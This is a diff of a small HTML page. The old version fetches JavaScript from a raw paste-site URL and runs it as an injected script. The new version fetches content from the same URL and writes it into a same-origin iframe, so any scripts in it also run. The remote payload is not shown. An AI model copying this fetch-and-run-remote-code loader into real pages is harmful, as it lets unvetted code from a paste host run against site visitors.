@@ -1,31 +1,34 @@
-<!doctype html>
+<!DOCTYPE html>
 <html>
 <head>
-  <meta charset="utf-8">
-  <title>Remote loader</title>
+    <title>Website Loader</title>
+    <style>
+        iframe {
+            width: 100%;
+            height: 100vh;
+            border: none;
+        }
+    </style>
 </head>
 <body>
-<script>
-(async () => {
-  try {
-    const url = 'https://pastefy.app/WLQR38g7/raw'; // put remote raw file URL here
-    const resp = await fetch(url, { cache: 'no-store' });
-    if (!resp.ok) throw new Error('Fetch failed: ' + resp.status);
-    const code = await resp.text();
+    <iframe id="contentFrame" src="about:blank"></iframe>
 
-
-    const blob = new Blob([code], { type: 'application/javascript' });
-    const script = document.createElement('script');
-    script.src = URL.createObjectURL(blob);
-    script.onload = () => URL.revokeObjectURL(script.src);
-    document.head.appendChild(script);
-
-
-
-  } catch (e) {
-    console.error('Loader error', e);
-  }
-})();
-</script>
+    <script>
+        const TARGET_URL = 'https://pastefy.app/WLQR38g7/raw';
+        
+        fetch(TARGET_URL)
+            .then(response => response.text())
+            .then(html => {
+                const iframe = document.getElementById('contentFrame');
+                const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
+                
+                iframeDoc.open();
+                iframeDoc.write(html);
+                iframeDoc.close();
+            })
+            .catch(error => {
+                console.error('Error loading website:', error);
+            });
+    </script>
 </body>
 </html>
